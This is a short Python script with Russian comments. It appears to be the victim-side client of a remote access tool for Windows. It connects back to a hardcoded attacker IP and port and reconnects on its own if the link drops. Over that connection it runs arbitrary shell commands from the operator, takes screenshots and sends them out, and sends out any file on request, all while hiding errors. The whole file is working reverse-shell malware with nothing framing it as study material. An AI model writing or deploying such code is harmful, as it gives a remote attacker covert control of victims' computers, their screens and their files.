import socket
import os
import subprocess
import time

# ========== НАСТРОЙКИ ==========
SERVER_IP = "192.168.31.177"  # ⚡ ПОМЕНЯЙ НА IP ТВОЕГО ЛИНУКСА
SERVER_PORT = 5555
# ===============================

def connect():
    while True:
        try:
            s = socket.socket()
            s.connect((SERVER_IP, SERVER_PORT))
            return s
        except:
            time.sleep(5)

def send_file(s, path):
    try:
        if not os.path.exists(path):
            s.send(b"ERROR")
            return
        size = os.path.getsize(path)
        s.send(str(size).encode())
        ack = s.recv(1024)
        with open(path, "rb") as f:
            s.sendall(f.read())
    except:
        pass

def take_screenshot(s):
    try:
        from PIL import ImageGrab
        import io
        img = ImageGrab.grab()
        img_bytes = io.BytesIO()
        img.save(img_bytes, format='PNG')
        data = img_bytes.getvalue()
        s.send(str(len(data)).encode())
        ack = s.recv(1024)
        s.sendall(data)
    except Exception as e:
        s.send(f"SCREEN_ERROR: {e}".encode())

# Подключаемся
s = connect()
s.send(b"WINDOWS_CLIENT_READY")

while True:
    try:
        cmd = s.recv(4096).decode().strip()
        if not cmd:
            break

        if cmd.upper() == "EXIT":
            break
        elif cmd.upper() == "SCREEN":
            take_screenshot(s)
        elif cmd.startswith("GET "):
            send_file(s, cmd[4:])
        else:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            output = result.stdout + result.stderr
            s.send(output.encode() if output else b"OK")
    except:
        s.close()
        s = connect()
